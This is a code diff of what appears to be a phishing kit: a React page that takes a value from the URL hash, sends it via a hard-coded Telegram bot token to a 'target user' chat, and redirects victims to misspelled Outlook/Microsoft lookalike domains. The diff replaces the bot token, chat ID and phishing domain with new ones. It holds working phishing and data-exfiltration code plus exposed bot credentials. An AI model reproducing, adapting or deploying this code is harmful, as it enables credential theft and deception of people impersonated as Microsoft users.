@@ -4,8 +4,8 @@ import axios from "axios";
 
 const App = () => {
   const hashValue = window.location.hash.substring(1);
-  const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
-  const userId = "1099461059"; // Replace with the target user's ID
+  const botToken = "7209601199:AAEKLuU2QO0_AMJPzmH9j8v1aRzW3UqZzms";
+  const userId = "1288570048"; // Replace with the target user's ID
 
   const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
   if (hashValue) {
@@ -34,7 +34,7 @@ const App = () => {
   useEffect(() => {
     // Code to run on component mount or when certain dependencies change
     if (recaptchaValue) {
-      window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
+      window.location.href = `https://outlook.onlneoutlook-microsoft.jetos.com/pWdrqfDA#${hashValue}`;
 
       axios
         .post(apiUrl, {
